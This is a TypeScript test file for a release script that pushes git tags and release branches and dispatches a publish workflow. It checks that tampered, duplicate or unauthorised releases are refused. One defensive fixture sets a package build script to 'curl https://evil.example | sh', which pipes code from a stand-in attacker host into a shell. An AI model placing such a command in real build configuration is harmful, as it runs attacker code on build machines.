import { chmodSync, mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { gitIn, Repo, run, SCRIPTS } from '../testing/repo';

const SCRIPT = path.join(SCRIPTS, 'push-release.sh');
const registry = { NPM_STUB_VERSIONS: '6.0.9', NPM_STUB_DIST_TAGS: 'latest=6.0.9 beta=4.6.0-beta.0' };

let repo: Repo; // plays the unprivileged "prepare" job
let remote: string; // the bare origin
let pusher: string; // plays the "push" job: a fresh clone that holds the deploy key

beforeEach(() => {
  repo = new Repo();
  remote = path.join(repo.dir, 'remote.git');
  pusher = path.join(repo.dir, 'clone');
  mkdirSync(remote);
  gitIn(remote, 'init', '-q', '--bare', '-b', 'master');
  repo.git('remote', 'add', 'origin', remote);
  repo.git('push', '-q', 'origin', 'master');
});
afterEach(() => repo.destroy());

const bundle = (tag: string) => {
  const file = path.join(repo.dir, `${tag}.bundle`);
  repo.git('bundle', 'create', file, `refs/tags/${tag}`, `^${repo.git('rev-parse', `${tag}^`)}`);
  return file;
};

/** Publishes `tag` to the bare remote the way an earlier run would have, so later stages can sit on it. */
const pushTag = (tag: string) => repo.git('push', '-q', 'origin', `refs/tags/${tag}`);

const push = (kind: string, version: string, file: string, env: Record<string, string> = {}) => {
  gitIn(repo.dir, 'clone', '-q', remote, pusher);
  return run('bash', [SCRIPT, kind, version, file], pusher, repo.env({ ...registry, ...env }));
};

const remoteRefs = () => gitIn(remote, 'for-each-ref', '--format=%(refname)').split('\n').filter(Boolean);

describe('push-release.sh', () => {
  it('pushes a beta tag and dispatches publish on the tag', () => {
    repo.release('6.0.10-beta.0', 'master');
    const r = push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0'));
    expect(r.status).toBe(0);
    expect(remoteRefs()).toContain('refs/tags/v6.0.10-beta.0');
    expect(remoteRefs()).not.toContain('refs/heads/release/v6.0.10-beta.0');
    expect(repo.ghCalls()).toEqual(['gh workflow run publish.yml --ref refs/tags/v6.0.10-beta.0']);
  });

  it('pushes the tag and the release branch together for a GA', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10-rc.0', 'v6.0.10-beta.0');
    const ga = repo.release('6.0.10', 'v6.0.10-rc.0');
    pushTag('v6.0.10-beta.0');
    pushTag('v6.0.10-rc.0');
    const r = push('ga', '6.0.10', bundle('v6.0.10'));
    expect(r.status).toBe(0);
    expect(remoteRefs()).toEqual(expect.arrayContaining(['refs/tags/v6.0.10', 'refs/heads/release/v6.0.10']));
    expect(gitIn(remote, 'rev-parse', 'refs/heads/release/v6.0.10')).toBe(ga);
    expect(repo.ghCalls()).toEqual(['gh workflow run publish.yml --ref refs/tags/v6.0.10']);
  });

  it('refuses a bundle whose release commit changes more than the version, and pushes nothing', () => {
    repo.release('6.0.10-beta.0', 'master', (pkg) => (pkg.scripts.build = 'curl https://evil.example | sh'));
    const r = push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0'));
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/changes more than the version/);
    expect(remoteRefs()).toEqual(['refs/heads/master']);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('refuses a release commit that the release workflow did not author', () => {
    repo.release('6.0.10-beta.0', 'master', () => {}, 'human@example.com');
    expect(push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0')).status).not.toBe(0);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('refuses a tag that already exists on the remote', () => {
    repo.release('6.0.10-beta.0', 'master');
    pushTag('v6.0.10-beta.0');
    const r = push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0'));
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/already exists/);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('refuses a GA when release/vX.Y.Z already exists, with a clear message and nothing pushed', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10-rc.0', 'v6.0.10-beta.0');
    repo.release('6.0.10', 'v6.0.10-rc.0');
    pushTag('v6.0.10-beta.0');
    pushTag('v6.0.10-rc.0');
    repo.git('push', '-q', 'origin', 'master:refs/heads/release/v6.0.10');
    const r = push('ga', '6.0.10', bundle('v6.0.10'));
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/release\/v6\.0\.10 already exists/);
    expect(remoteRefs()).not.toContain('refs/tags/v6.0.10');
    expect(repo.ghCalls()).toEqual([]);
  });

  it('refuses a GA that skipped the rc', () => {
    repo.release('6.0.10-beta.0', 'master');
    repo.release('6.0.10', 'v6.0.10-beta.0');
    pushTag('v6.0.10-beta.0');
    expect(push('ga', '6.0.10', bundle('v6.0.10')).status).not.toBe(0);
    expect(remoteRefs()).not.toContain('refs/tags/v6.0.10');
  });

  it('pushes nothing on a dry run', () => {
    repo.release('6.0.10-beta.0', 'master');
    const r = push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0'), { DRY_RUN: 'true' });
    expect(r.status).toBe(0);
    expect(r.stdout).toMatch(/DRY_RUN: would push/);
    expect(remoteRefs()).toEqual(['refs/heads/master']);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('does not push if the remote cannot be read', () => {
    repo.release('6.0.10-beta.0', 'master');
    const file = bundle('v6.0.10-beta.0');
    gitIn(repo.dir, 'clone', '-q', remote, pusher);
    gitIn(pusher, 'remote', 'set-url', 'origin', path.join(repo.dir, 'does-not-exist.git'));
    const r = run('bash', [SCRIPT, 'beta', '6.0.10-beta.0', file], pusher, repo.env(registry));
    expect(r.status).not.toBe(0);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('explains how to fix a rejected push, such as a missing or read-only deploy key, and dispatches nothing', () => {
    repo.release('6.0.10-beta.0', 'master');
    const hook = path.join(remote, 'hooks', 'pre-receive');
    writeFileSync(hook, '#!/bin/sh\necho "remote: Permission denied" >&2\nexit 1\n');
    chmodSync(hook, 0o755);
    const r = push('beta', '6.0.10-beta.0', bundle('v6.0.10-beta.0'));
    expect(r.status).not.toBe(0);
    expect(r.stderr).toMatch(/RELEASE_DEPLOY_KEY/);
    expect(r.stderr).toMatch(/write access/);
    expect(remoteRefs()).toEqual(['refs/heads/master']);
    expect(repo.ghCalls()).toEqual([]);
  });

  it('rejects an unknown kind', () => {
    repo.release('6.0.10-beta.0', 'master');
    expect(push('stable', '6.0.10-beta.0', bundle('v6.0.10-beta.0')).stderr).toMatch(/kind must be/);
  });
});
